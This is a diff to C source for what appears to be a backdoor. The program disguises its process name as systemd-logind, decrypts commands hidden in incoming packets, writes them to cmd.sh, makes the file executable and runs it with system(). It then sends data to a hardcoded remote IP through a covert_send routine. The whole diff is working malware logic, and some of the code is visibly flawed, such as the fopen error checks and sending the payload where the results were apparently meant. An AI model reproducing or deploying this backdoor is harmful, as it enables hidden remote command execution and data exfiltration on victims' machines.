@@ -5,7 +5,8 @@
 #define PORT "8505"
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
-#define CMD "cmd.sh > results"
+#define CMD "./cmd.sh > results"
+#define CHMOD "chmod 755 cmd.sh"
 
 struct payload{
     char key[5]; // always 8505
@@ -175,10 +176,11 @@ void ParsePayload(const u_char *payload, int len){
     unsigned char decryptedtext[BUFSIZE+16];
     int decryptedlen, cipherlen;
     char *args[1];
-
+    char *newenvion[] = { NULL };
+    char *newargs[] = { NULL, "HELLO", "WORLD", NULL};
     args[0] = CMD;
 
-    if((fp = fopen(CMD, "wb+")) < 0){
+    if((fp = fopen("cmd.sh", "wb+")) < 0){
         perror("fopen");
         exit(1);
     }
@@ -189,10 +191,24 @@ void ParsePayload(const u_char *payload, int len){
 
     printf("Decrypted payload size: %d\n", decryptedlen);
     printf("Decrypted Payload is: %s \n", decryptedtext);
-    if((fwrite(decryptedtext, sizeof(decryptedtext), sizeof(char), fp)) <= 0){
+    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
         perror("fwrite");
         exit(1);
     }
+    fclose(fp);
+    //execve(CHMOD, newargs, newenvion);
+    //execve(CMD, newargs,newenvion);
+    system(CHMOD);
+    system(CMD);
+    if((fp = fopen("results", "rb+")) < 0){
+        perror("fopen");
+        exit(1);
+    }
 
-    execve(CMD, args,0);
+    char *srcip = "142.232.153.106";
+    char *destip = "192.168.1.3";
+    unsigned short sport = 8505;
+    unsigned short dport = 8505;
+
+    covert_send(srcip, destip, sport, dport, decryptedtext);
 }
